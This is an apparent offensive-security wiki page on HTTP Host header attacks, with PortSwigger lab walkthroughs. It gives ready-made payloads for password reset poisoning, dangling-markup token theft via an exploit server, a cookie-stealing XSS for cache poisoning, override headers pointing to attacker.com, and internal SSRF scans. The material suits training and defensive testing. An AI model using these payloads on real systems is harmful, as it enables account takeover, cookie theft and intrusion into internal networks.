---
title: "HTTP Host Header Attacks"
type: technique
tags: [exploitation, password-reset-poisoning, ssrf, web]
phase: exploitation
severity: high
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [git-portswigger-all-labs]
---

# HTTP Host Header Attacks

## Overview

The HTTP `Host` header is a mandatory component of HTTP/1.1 requests. It specifies the domain name the client wants to access and is used for:

- **Virtual Hosting**: Distinguishing between multiple websites hosted on the same IP address.
- **Routing via Intermediaries**: Guiding reverse proxies, load balancers, and CDNs to the correct back-end application.

Host header attacks occur when a server implicitly trusts or mishandles the user-controlled `Host` header, leading to exploitable vulnerabilities. Because the `Host` header is technically user-controlled, any application logic that relies on it without strict validation is potentially exploitable.

**Root causes:**

1. Implicit trust — assuming the `Host` header cannot be tampered with.
2. Poor validation — failing to validate or escape the header value.
3. Insecure defaults — many third-party frameworks and tools trust headers like `X-Forwarded-Host` without requiring explicit configuration.
4. Component discrepancies — front-end and back-end systems may interpret headers differently, creating exploitable gaps.

**Vulnerability classes enabled:**

- Password reset poisoning
- Web cache poisoning
- Routing-based SSRF
- SSRF via flawed request parsing
- Host header authentication bypass
- Connection state attacks
- Business logic flaws and classic injection (e.g., SQLi reflected in Host)

## Attack Techniques

### Password Reset Poisoning

Applications that generate password reset links using the `Host` header value are vulnerable. By substituting an attacker-controlled domain in the `Host` header, the reset link emailed to the victim will point to the attacker's server. When the victim clicks the link, the attacker captures the reset token.

**Basic flow:**

1. Intercept the POST request to the forgot-password endpoint in Burp Suite.
2. Change the `Host` header to your exploit/collaborator server domain.
3. Submit the request — the application emails the victim a link pointing to your server.
4. Monitor your server's access log for an incoming GET request containing the reset token.
5. Use the captured token to reset the victim's password.

### Password Reset Poisoning via Dangling Markup

A more advanced variant where the application validates the Host header but still embeds it into HTML email content. By injecting dangling markup into the Host header, the attacker causes the email client to issue a request to their server containing the reset token.

**Payload:**

```http
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

This causes the email to contain an open `<a>` tag that captures everything after it (including the token) as a URL parameter sent to the attacker's server.

### Host Header Authentication Bypass

Some applications restrict admin panels or sensitive endpoints to "local" users by checking if the `Host` header equals `localhost` or `127.0.0.1`. By setting the `Host` header to `localhost`, an external attacker can bypass this access control.

**Flow:**

1. Navigate to an admin or restricted endpoint (e.g., `/admin`).
2. Intercept the request in Burp.
3. Change `Host: target.com` to `Host: localhost`.
4. Forward — the application may grant admin access.

### Web Cache Poisoning via Ambiguous Requests

When a caching layer uses the `Host` header as part of the cache key, injecting a malicious value can cause the cache to store a poisoned response and serve it to legitimate users.

**Key observation:** A duplicate `Host` header (one legitimate, one injected) may cause the back-end to reflect the attacker's value while the cache keys on the first legitimate value — causing the poisoned response to be cached and served to others.

**Cache indicator headers to monitor:**
- `X-Cache: hit` / `X-Cache: miss`
- `Age: <seconds>` — time content has been in cache
- `Cache-Control: max-age=<seconds>` — cache lifetime

**Attack flow:**

1. Send a request with a duplicate `Host` header; observe whether the second value is reflected.
2. Inject an XSS payload as the second `Host` value:
```
Host: test.net"></script><script>alert(document.cookie)</script>
```
3. Send the request repeatedly until the poisoned response is cached (`X-Cache: hit`).
4. Verify other users receive the poisoned response.

### Routing-Based SSRF

Reverse proxies and load balancers often route traffic to back-end services based on the `Host` header. If there is no validation, an attacker can set the `Host` header to an internal IP or hostname, causing the intermediary to forward the request to internal-only services.

**Detection with Burp Collaborator:**

1. Set `Host` to your Burp Collaborator subdomain.
2. Send the request.
3. If the collaborator receives a DNS lookup or HTTP request, routing-based SSRF is confirmed.

**Internal IP enumeration:**

```http
GET / HTTP/1.1
Host: 192.168.0.§1§
```

Use Burp Intruder with a Numbers payload (0–255) against the last octet to scan the `192.168.0.0/24` range. A response with a different status code (e.g., 302 redirect) indicates a live internal host.

**Common private IP ranges to scan:**

| Range | Scope |
|---|---|
| `10.0.0.0/8` | 10.x.x.x |
| `172.16.0.0/12` | 172.16.x.x – 172.31.x.x |
| `192.168.0.0/16` | 192.168.x.x |

### SSRF via Flawed Request Parsing

When an application validates the `Host` header and rejects modifications, it may still accept an absolute URL in the request line. In this case, the middleware validates the absolute URL's host but uses the `Host` header for routing — creating a bypass.

**Technique:**

```http
GET https://TARGET-LAB-ID.web-security-academy.net/ HTTP/1.1
Host: BURP-COLLABORATOR-SUBDOMAIN
```

The absolute URL passes the application's host validation; the `Host` header is used by the intermediary for routing, causing it to connect to the attacker's server.

**Admin panel access via this technique:**

```http
GET https://TARGET-LAB-ID.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.137
```

**Deleting a user:**

```http
GET https://TARGET-LAB-ID.web-security-academy.net/admin/delete?csrf=<TOKEN>&username=carlos HTTP/1.1
Host: 192.168.0.137
```

### Connection State Attack (Host Validation Bypass)

Some front-end servers validate the `Host` header only on the first request of a connection, then assume subsequent requests on the same persistent connection are trusted. By sending a legitimate first request followed by a malicious second request on the same connection, the attacker bypasses host validation.

**Setup in Burp Repeater:**

1. Tab 1 — Legitimate request:
```http
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Connection: keep-alive
```

2. Tab 2 — Malicious request:
```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```

3. Group both tabs in Burp Repeater.
4. Set send mode to **"Send group in sequence (single connection)"**.
5. Send — the second request bypasses host validation and accesses the admin panel.

## Payloads

### Basic Host Override

```http
Host: attacker.com
Host: localhost
Host: 127.0.0.1
```

### Subdomain and Port Variations

```http
Host: attacker.com:90
Host: hacked-subdomain.vulnerable.com
Host: notvulnerable-website.com
```

### Absolute URL with Host Header Override

```http
GET https://vulnerable.com/ HTTP/1.1
Host: attacker.com
```

### Override Headers (when `Host` is validated)

```http
Host: vulnerable.com
X-Forwarded-Host: attacker.com
```

Other override headers to try:

```
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

### XSS via Cache Poisoning

```http
Host: test.net"></script><script>alert(document.cookie)</script>
```

### Dangling Markup for Email Token Capture

```http
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

### Routing-Based SSRF Internal Scan (Burp Intruder)

```http
GET / HTTP/1.1
Host: 192.168.0.§1§
```

Payload: Numbers, 0–255.

### SSRF via Flawed Request Parsing

```http
GET https://TARGET-LAB-ID.web-security-academy.net/admin/delete?csrf=<TOKEN>&username=carlos HTTP/1.1
Host: 192.168.0.137
```

## Bypass Techniques

### Duplicate Host Headers

Some servers use the first `Host` header for validation but the second for routing:

```http
GET / HTTP/1.1
Host: vulnerable.com
Host: attacker.com
```

### Indented / Whitespace-Prefixed Header

Some parsers treat an indented header line as a continuation of the previous header:

```http
GET / HTTP/1.1
Host: vulnerable.com
 Host: attacker.com
```

### Absolute URL to Bypass Host Validation

When the server validates `Host` but routes based on the request line, provide an absolute URL to pass validation while the `Host` header controls routing:

```http
GET https://legitimate.com/path HTTP/1.1
Host: internal.attacker.com
```

### Connection State Exploitation

Exploit per-connection trust: send a legitimate first request, then a malicious second request over the same `keep-alive` connection. The server trusts the connection state established by the first request.

### Override Headers

If the `Host` header itself is validated, inject a secondary header that the application or middleware may trust:

- `X-Forwarded-Host`
- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`

### Port Injection

Appending a port or injecting characters after a colon may cause the application to extract only the hostname while reflecting the full string:

```http
Host: vulnerable.com:evil-injected-value
```

## PortSwigger Labs

### Apprentice

#### Lab 1 — Basic Password Reset Poisoning

**Goal:** Exploit unsanitized `Host` header in the password reset flow to steal carlos's reset token and change his password.

**Steps:**

1. Log in as `wiener:peter` and trigger a password reset for wiener to observe normal behaviour.
2. Confirm the reset email contains a link with a token parameter.
3. Intercept the forgot-password POST request in Burp and send to Repeater.
4. Change the `Host` header to your exploit server domain.
5. Change the `username` parameter to `carlos`.
6. Send the request — the application emails carlos a reset link pointing to your server.
7. Check your exploit server's access log for a GET request containing carlos's reset token.
8. Navigate to `https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=<TOKEN>` to set carlos's new password.
9. Log in as carlos to solve the lab.

#### Lab 2 — Host Header Authentication Bypass

**Goal:** Bypass admin panel access restriction by manipulating the `Host` header.

**Steps:**

1. Browse to `/admin` — observe "only local users can access this".
2. Intercept the request in Burp Repeater.
3. Change `Host` to `localhost`.
4. Forward the request — admin panel is now accessible.
5. Send a DELETE request (or use the admin form) to delete carlos and solve the lab.

### Practitioner

#### Lab 3 — Web Cache Poisoning via Ambiguous Requests

**Goal:** Poison the web cache by injecting a malicious `Host` header that gets reflected in cached responses, triggering XSS for other users.

**Steps:**

1. Send a GET `/` request to Burp Repeater.
2. Add a duplicate `Host` header with an arbitrary value; observe it is reflected in the response.
3. Monitor `X-Cache`, `Age`, and `Cache-Control` headers to understand cache behaviour.
4. Inject an XSS payload in the duplicate `Host` header:
```
Host: test.net"></script><script>alert(document.cookie)</script>
```
5. Send the request repeatedly until the response is served from cache (`X-Cache: hit`, `Age > 0`).
6. Verify the alert fires in the browser to confirm cache poisoning.

#### Lab 4 — Routing-Based SSRF

**Goal:** Use the `Host` header to route requests to internal services and access the admin panel to delete carlos.

**Steps:**

1. Send a GET `/` request and confirm normal behaviour.
2. Set `Host` to your Burp Collaborator subdomain; confirm the server makes a DNS/HTTP request to it.
3. Use Burp Intruder to brute-force the last octet of `192.168.0.0/24`:
```http
Host: 192.168.0.§1§
```
   Payload: Numbers 0–255.
4. Identify the internal IP that returns a redirect (302) to `/admin`.
5. Set `Host` to that internal IP and navigate to `/admin`.
6. Extract the CSRF token and send a POST to `/admin/delete` with `username=carlos`.

#### Lab 5 — SSRF via Flawed Request Parsing

**Goal:** Bypass `Host` header validation using an absolute URL in the request line, then perform SSRF to access the internal admin panel.

**Steps:**

1. Confirm the server rejects modified `Host` headers (returns 400/403).
2. Switch to an absolute URL in the request line — observe the request is now accepted:
```http
GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
3. Set the `Host` header to your Burp Collaborator subdomain and confirm SSRF via incoming collaborator interaction.
4. Use Burp Intruder to scan `192.168.0.0/24` with the absolute URL:
```http
GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.§1§
```
5. Identify the internal IP (the one returning a redirect to `/admin`).
6. Access `/admin` and obtain the CSRF token.
7. Delete carlos:
```http
GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=<TOKEN>&username=carlos HTTP/1.1
Host: 192.168.0.<INTERNAL_OCTET>
```
8. Convert to POST (right-click → "Change request method") and send.

#### Lab 6 — Host Validation Bypass via Connection State Attack

**Goal:** Exploit per-connection trust to bypass host validation and access the admin panel.

**Steps:**

1. Confirm direct `Host` modification is rejected (redirects back to the lab domain).
2. Confirm duplicate headers and indented headers are also rejected.
3. Create two Burp Repeater tabs:
   - **Tab 1:** `GET /` with the legitimate `Host` header and `Connection: keep-alive`.
   - **Tab 2:** `GET /admin` with `Host: 192.168.0.1` and `Connection: keep-alive`.
4. Group both tabs in Burp Repeater.
5. Set send mode to **"Send group in sequence (single connection)"**.
6. Send — Tab 2 bypasses host validation and returns the admin panel.
7. From the admin panel response, extract the CSRF token.
8. Modify Tab 2 to POST to `/admin/delete` with `csrf=<TOKEN>&username=carlos`.
9. Send the group again on a single connection to delete carlos.

### Expert

#### Lab 7 — Password Reset Poisoning via Dangling Markup

**Goal:** Exploit dangling markup injection in the `Host` header to capture carlos's password reset token from an HTML email.

**Steps:**

1. Trigger a password reset for wiener and observe the reset email in the exploit server's email client.
2. Confirm that modifying the `Host` header to `evil.com` causes a 504 error (Host is used in link generation).
3. Confirm the exploit server domain works as a replacement `Host`:
```http
Host: exploit-SERVER-ID.exploit-server.net
```
4. Test port injection:
```http
Host: exploit-SERVER-ID.exploit-server.net:90
```
   Confirm the email still arrives (full Host value including port is embedded).
5. Inject dangling markup to steal the token via an open anchor tag:
```http
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```
6. Verify the technique for wiener: check exploit server access logs for a request containing the reset token or temporary password.
7. Log in as wiener with the captured credentials to confirm the attack works.
8. Repeat step 5 with `username=carlos` in the request body.
9. Check access logs for carlos's token/password.
10. Log in as carlos to solve the lab.

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[host-header]]
